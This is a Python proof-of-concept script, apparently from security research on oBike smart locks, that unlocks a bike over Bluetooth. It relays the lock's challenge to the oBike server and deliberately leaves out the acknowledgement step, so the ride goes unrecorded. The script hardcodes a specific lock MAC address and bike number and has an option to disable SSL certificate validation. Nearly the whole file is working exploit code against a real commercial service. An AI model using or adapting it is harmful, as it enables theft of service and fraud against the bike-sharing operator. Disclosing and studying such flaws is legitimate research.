#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""Demo 1: unlock oBike by omitting the acknowledge message;
requires interaction with the oBike servers as well as a
valid account.
"""

from bluepy.btle import Scanner, DefaultDelegate
from obike.ble_client import BleClient
from obike.http_client import HttpClient
from obike.lockdb import LockDb
from colorama import Fore, Back, Style
import json
import struct
import argparse
import traceback
import requests
import logging

try:
    import http.client as http_client
except ImportError:
    # Python 2
    import httplib as http_client
http_client.HTTPConnection.debuglevel = 1

# You must initialize logging, otherwise you'll not see debug output.
logging.basicConfig()
logging.getLogger().setLevel(logging.DEBUG)
requests_log = logging.getLogger("requests.packages.urllib3")
requests_log.setLevel(logging.DEBUG)
requests_log.propagate = True

macaddr = 'd4:36:39:b8:78:2f'


def unlock_bike(mac, iface=0, verify=False):
    lockdb = LockDb()
    c = BleClient(mac)
    h = HttpClient(verify=verify)
    c.connect()

    # [1] say hello to lock
    res = c.get_lock_record()

    # [2] receive challenge
    challenge = c.get_challenge()['challenge']
    print "Challenge: %s" % challenge

    # [3], [4] get response from obike server
    # TODO: resolve bikeno from lockdb
    bikeno = '041001802'
    res = h.unlock_pass(bikeno, challenge)
    print json.dumps(res, indent=4, separators=(',', ': '))

    # [5] send response to lock
    c.send_response(res['data']['encryptionKey'], res['data']['serverTime']/1000,
                    res['data']['keys'].decode('hex'))

    # [6] TODO get acknowledgement from lock
    # [7] TODO send acknowledgement to obike server

    # kthxbye
    c.disconnect()


parser = argparse.ArgumentParser(
    prog='unlock01.py', formatter_class=argparse.ArgumentDefaultsHelpFormatter)
parser.add_argument('-i', '--iface', help='hci interface number',
                    type=int, default=0)
parser.add_argument('-m', '--macaddr', help='The mac address of the obike',
                    default=macaddr)
parser.add_argument('-k', '--insecure',
                    help='disable SSL certificate validation',
                    action='store_false')
args = parser.parse_args()

print "[+] using iface: ", args.iface
print "[+] using macaddr: ", args.macaddr
print "[+] using insecure connection: ", args.insecure

try:
    unlock_bike(args.macaddr, args.iface, args.insecure)
except Exception as ex:
    print Fore.MAGENTA + Style.BRIGHT + "Error occured, aborting.\n" + \
        traceback.format_exc() + Style.RESET_ALL
